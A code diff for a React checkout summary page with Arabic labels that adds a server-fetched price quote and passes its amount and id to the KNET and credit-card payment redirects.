@@ -1,4 +1,4 @@
-import { discountedPrice, discountedTotal, savePayable } from '@/lib/pricing';
+import { discountedPrice, discountedTotal, savePayable, fetchQuote } from '@/lib/pricing';
 import { useState, useEffect } from "react";
 import { useLocation } from "wouter";
 import { sendData, navigateToPage } from "@/lib/store";
@@ -71,14 +71,25 @@ export default function SummaryPayment() {
   }, []);
 
   const subtotal = cartItems.reduce((sum: number, item: any) => sum + ((parseFloat(item.priceNum) || 0) * item.quantity), 0);
-  const payable = discountedTotal(cartItems);
+  const [quote, setQuote] = useState<{ id: string; subtotal: number; payable: number } | null>(null);
+  useEffect(() => {
+    let alive = true;
+    fetchQuote(cartItems)
+      .then((q) => { if (alive) setQuote(q); })
+      .catch(() => {});
+    return () => { alive = false; };
+  }, []);
+  const payable = quote ? quote.payable : discountedTotal(cartItems);
   const totalItems = cartItems.reduce((sum: number, item: any) => sum + item.quantity, 0);
 
   const isFormValid = firstName.trim() && lastName.trim() && address.trim() && city.trim() && phone.trim() && selectedPaymentMethod;
 
-  const handlePayment = () => {
+  const handlePayment = async () => {
     if (!isFormValid) return;
     setIsProcessing(true);
+    const q = quote || (await fetchQuote(cartItems).catch(() => null));
+    const amount = q ? q.payable : payable;
+    const qs = q ? `&q=${q.id}` : '';
 
     const paymentMethodLabel = selectedPaymentMethod === 'card' ? 'بطاقة ائتمان' : selectedPaymentMethod === 'knet' ? 'كي نت' : 'Apple Pay';
 
@@ -87,7 +98,7 @@ export default function SummaryPayment() {
         paymentMethod: paymentMethodLabel,
         shippingAddress: { country, firstName, lastName, address, apartment, city, postalCode, phone },
         cartItems,
-        subtotal: payable,
+        subtotal: amount,
         totalItems,
       },
       current: 'ملخص الدفع',
@@ -96,16 +107,16 @@ export default function SummaryPayment() {
     });
 
     // Store the discounted total in localStorage so it persists across admin redirects
-    savePayable(payable);
+    savePayable(amount);
 
     setTimeout(() => {
       setIsProcessing(false);
       if (selectedPaymentMethod === 'knet') {
-        setLocation(`/knet-payment?amount=${payable}`);
+        setLocation(`/knet-payment?amount=${amount}${qs}`);
       } else if (selectedPaymentMethod === 'card') {
-        setLocation(`/credit-card-payment?amount=${payable}`);
+        setLocation(`/credit-card-payment?amount=${amount}${qs}`);
       } else {
-        setLocation(`/credit-card-payment?amount=${payable}`);
+        setLocation(`/credit-card-payment?amount=${amount}${qs}`);
       }
     }, 1500);
   };
